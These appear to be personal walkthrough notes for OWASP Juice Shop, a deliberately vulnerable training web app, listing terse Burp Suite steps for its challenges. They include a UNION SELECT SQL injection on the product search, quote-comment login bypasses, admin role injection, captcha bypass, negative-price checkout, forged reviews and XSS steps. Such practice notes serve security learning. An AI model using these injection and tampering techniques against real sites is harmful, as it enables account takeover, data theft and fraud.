## Register Admin
- capture a create user request in burp
- add a section "role":"admin"

## Bjoern's Pet
- bjoern@owasp.org
- pets name is Zaya

## Captcha Bypass
- customer feedback page
- capture the review in burp
- send to intruder
- change to null payload and clear symbols
- send 10 times

## Database Schema
- capture /rest/produts/search
- insert banana'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--

## Deluxe Fraud
- navigate to become a member
- capture /rest/deluxe
- change to post
- add {"paymentMode":"none","paymentId":9}

## Forged Feedback
- capture customer feedback
- change userid 

## Forged Review
- caputre editing review
- change to PUT /rest/products/6/reviews
- change or add {"id":"6G3HpeSPsHZvoq8s7","message":"I bought it, would buy again."}

## GDPR Data Erasure
- login with chris.pike@juice-sh.op'--

## Login Amy
- amy@juice-sh.op
- K1f.....................

## Login Bender
- login with
- bender@juice-sh.op'--

## Login Jim
- jim@juice-sh.op'--

## Manipulate basket
- capture request adding to basket
- change to POST
{"ProductId":1,"BasketId":1,
"quantity":3,
"BasketId":5}

## Payback time
- capture adding something to cart
- turn amount into -10000
- checkout

## Privacy Policy inspection
- /we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility

## Product Tampering
- login as admin
- navigate to the product
- change to PUT /api/Products/9 HTTP/1.1 
- add Content-Type: application/json
- add  {"description": "<a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>"}

## Reset Jim's Password
- jim@juice-sh.op
- Samuel

## API Only XSS
- login as admin
- capture with burp to find the request to an api with the bearer token
- change to post
- add content-type: application/json
- add the payload to the description of a product
- putting \ infront of "

## Client-side XSS Protection
- capture creating user
- send to repeater
- change email to a script
- login to admin
- go to /administration


